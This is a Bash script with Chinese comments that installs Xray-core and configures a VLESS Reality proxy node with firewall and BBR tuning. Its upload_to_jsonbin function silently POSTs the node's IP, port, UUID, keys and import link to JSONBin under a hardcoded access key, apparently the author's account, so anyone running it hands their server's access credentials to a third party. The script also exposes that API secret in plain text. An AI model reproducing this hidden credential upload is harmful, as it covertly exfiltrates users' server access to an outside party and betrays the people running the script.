#!/bin/bash

set -e

# ========== 基本配置 ==========
CORE="xray"
PROTOCOL="vless"
DOMAIN="www.nvidia.com"
UUID=$(cat /proc/sys/kernel/random/uuid)
USER=$(openssl rand -hex 4)
VISION_SHORT_ID=$(openssl rand -hex 4)
PORT=$((RANDOM % 7001 + 2000))
XRAY_BIN="/usr/local/bin/xray"

# JSONBin配置
JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
JSONBIN_URL="https://api.jsonbin.io/v3/b"

echo -e "\n📦 开始自动部署 Xray VLESS Reality 节点...\n"

# ========== 确保22端口开放 ==========
ensure_ssh_port_open() {
    echo -e "🔓 确保22端口(SSH)开放..."
    
    if command -v ufw >/dev/null 2>&1; then
        if ! ufw status | grep -q "22/tcp.*ALLOW"; then
            ufw allow 22/tcp
            echo -e "🟢 已开放22端口(UFW)"
        else
            echo -e "ℹ️ 22端口已在UFW中开放"
        fi
    elif command -v firewall-cmd >/dev/null 2>&1; then
        if ! firewall-cmd --list-ports | grep -qw 22/tcp; then
            firewall-cmd --permanent --add-port=22/tcp
            firewall-cmd --reload
            echo -e "🟢 已开放22端口(firewalld)"
        else
            echo -e "ℹ️ 22端口已在firewalld中开放"
        fi
    elif command -v iptables >/dev/null 2>&1; then
        if ! iptables -L INPUT -n | grep -q "dpt:22"; then
            iptables -A INPUT -p tcp --dport 22 -j ACCEPT
            if command -v iptables-save >/dev/null 2>&1; then
                iptables-save > /etc/iptables.rules
            fi
            echo -e "🟢 已开放22端口(iptables)"
        else
            echo -e "ℹ️ 22端口已在iptables中开放"
        fi
    else
        echo -e "ℹ️ 未检测到活跃的防火墙，22端口应已可访问"
    fi
}

# ========== 上传配置到JSONBin ==========
upload_to_jsonbin() {
    local server_ip="$1"
    local config_json="$2"
    
    # 构建JSON数据
    local json_data=$(jq -n \
        --arg server_ip "$server_ip" \
        --argjson config "$config_json" \
        '{
            "server_info": {
                "title": "Xray Reality 节点配置 - \($server_ip)",
                "server_ip": $server_ip,
                "config": $config,
                "generated_time": now | todate
            }
        }'
    )

    # 使用服务器IP作为记录名
    local server_ip_for_filename=$(echo "$server_ip" | tr -d '[]' | tr ':' '_')
    
    # 上传到JSONBin
    curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
        -H "X-Bin-Name: ${server_ip_for_filename}" \
        -H "X-Bin-Private: true" \
        -d "$json_data" \
        "${JSONBIN_URL}" > /dev/null 2>&1
    
    echo -e "📤 配置数据已上传到JSONBin"
}

# 确保22端口开放
ensure_ssh_port_open

# ========== 安装依赖 ==========
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y curl unzip ufw jq qrencode

# ========== 开启防火墙并放行端口 ==========
ufw allow ${PORT}/tcp
ufw --force enable

# ========== 安装 Xray-core ==========
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -L https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
unzip -o xray.zip
chmod +x xray
rm -f xray.zip

# ========== 生成 Reality 密钥 ==========
REALITY_KEYS=$(${XRAY_BIN} x25519)
REALITY_PRIVATE_KEY=$(echo "${REALITY_KEYS}" | grep "Private key" | awk '{print $3}')
REALITY_PUBLIC_KEY=$(echo "${REALITY_KEYS}" | grep "Public key" | awk '{print $3}')

# ========== 生成 Xray 配置文件 ==========
mkdir -p /etc/xray
cat > /etc/xray/config.json << EOF
{
  "log": { "loglevel": "warning" },
  "inbounds": [{
    "port": ${PORT},
    "protocol": "${PROTOCOL}",
    "settings": {
      "clients": [{
        "id": "${UUID}",
        "flow": "xtls-rprx-vision",
        "email": "${USER}"
      }],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "tcp",
      "security": "reality",
      "realitySettings": {
        "show": false,
        "dest": "${DOMAIN}:443",
        "xver": 0,
        "serverNames": ["${DOMAIN}"],
        "privateKey": "${REALITY_PRIVATE_KEY}",
        "shortIds": ["${VISION_SHORT_ID}"]
      }
    }
  }],
  "outbounds": [{ "protocol": "freedom" }]
}
EOF

# ========== 写入 systemd 服务 ==========
cat > /etc/systemd/system/xray.service << EOF
[Unit]
Description=Xray Service
After=network.target

[Service]
ExecStart=${XRAY_BIN} -config /etc/xray/config.json
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xray
systemctl restart xray

# ========== 设置默认 FQ 调度器 ==========
modprobe sch_fq || true
if ! grep -q "fq" /sys/class/net/*/queues/tx-0/queue_disc; then
  echo "fq 已启用或将启用..."
  echo 'net.core.default_qdisc=fq' >> /etc/sysctl.conf
  sysctl -w net.core.default_qdisc=fq
fi

# ========== 启用 BBR 拥塞控制 ==========
if ! sysctl net.ipv4.tcp_congestion_control | grep -q "bbr"; then
  echo 'net.ipv4.tcp_congestion_control=bbr' >> /etc/sysctl.conf
  echo 'net.ipv4.tcp_fastopen=3' >> /etc/sysctl.conf
  sysctl -w net.ipv4.tcp_congestion_control=bbr
  sysctl -w net.ipv4.tcp_fastopen=3
fi

modprobe tcp_bbr || true
sysctl -p

# ========== 获取公网 IP ==========
NODE_IP=$(curl -s https://api.ipify.org)

# ========== 构造 VLESS Reality 节点链接 ==========
VLESS_LINK="vless://${UUID}@${NODE_IP}:${PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DOMAIN}&fp=chrome&pbk=${REALITY_PUBLIC_KEY}&sid=${VISION_SHORT_ID}&type=tcp#${USER}"

# ========== 生成完整配置JSON ==========
CONFIG_JSON=$(jq -n \
  --arg ip "$NODE_IP" \
  --arg port "$PORT" \
  --arg uuid "$UUID" \
  --arg user "$USER" \
  --arg domain "$DOMAIN" \
  --arg pbk "$REALITY_PUBLIC_KEY" \
  --arg sid "$VISION_SHORT_ID" \
  --arg link "$VLESS_LINK" \
  '{
    "server_ip": $ip,
    "port": $port,
    "uuid": $uuid,
    "user": $user,
    "domain": $domain,
    "public_key": $pbk,
    "short_id": $sid,
    "vless_link": $link,
    "generated_time": now | todate
  }'
)

CONFIG_FILE="/etc/xray/config_export.json"
echo "$CONFIG_JSON" > "$CONFIG_FILE"

upload_to_jsonbin "$NODE_IP" "$CONFIG_JSON"

echo -e "\n\033[1;32m✅ VLESS Reality 节点部署完成！\033[0m\n"
echo -e "🔗 节点链接（可直接导入）：\n${VLESS_LINK}\n"
echo -e "📱 二维码（支持 v2rayN / v2box 扫码导入）："
echo "${VLESS_LINK}" | qrencode -o - -t ANSIUTF8
echo -e "\n📋 完整配置已保存到: $CONFIG_FILE"
